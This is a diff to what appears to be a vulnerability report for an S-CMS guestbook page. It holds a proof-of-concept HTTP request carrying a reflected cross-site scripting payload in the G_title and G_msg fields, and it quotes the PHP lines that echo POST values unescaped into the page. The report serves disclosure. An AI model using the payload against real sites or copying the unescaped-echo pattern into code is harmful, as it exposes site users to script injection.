@@ -1,4 +1,4 @@
-payload:
+##payload:
 
 POST /s_cms/booksave.php HTTP/1.1
 Host: 127.0.0.1
@@ -13,3 +13,20 @@ Cookie: add=%E4%B8%AD%E5%9B%BD; Hm_lvt_b60316de6009d5654de7312f772162be=15707156
 Upgrade-Insecure-Requests: 1
 
 G_title=aaa%22%3E%3Cimg+src%3D1+onerror%3Dalert%281%29%3E&G_name=a&G_phone=12312311231&G_mail=1%4011.com&G_msg=11111aaa%22%3E%3Cimg+src%3D1+onerror%3Dalert%282%29%3E&Submit=%E6%8F%90%E4%BA%A4%E4%BF%A1%E6%81%AF
+
+
+##
+booksave.php 
+the number of line: 49-57
+
+```javascript
+      <form action="?action=save" method="post">
+    <input type="hidden" name="G_title" value="<?php echo $_POST["G_title"]?>">
+    <input type="hidden" name="G_name" value="<?php echo $_POST["G_name"]?>">
+    <input type="hidden" name="G_mail" value="<?php echo $_POST["G_mail"]?>">
+    <input type="hidden" name="G_phone" value="<?php echo $_POST["G_phone"]?>">
+    <input type="hidden" name="G_msg" value="<?php echo $_POST["G_msg"]?>">
+    <iframe src="conn/code_1.php?name=G_code" scrolling="no" frameborder="0" width="100%" height="40"></iframe>
+    <button class="btn btn-primary" type="submit" style="margin: 10px 0">确定</button>
+    </form>
+```
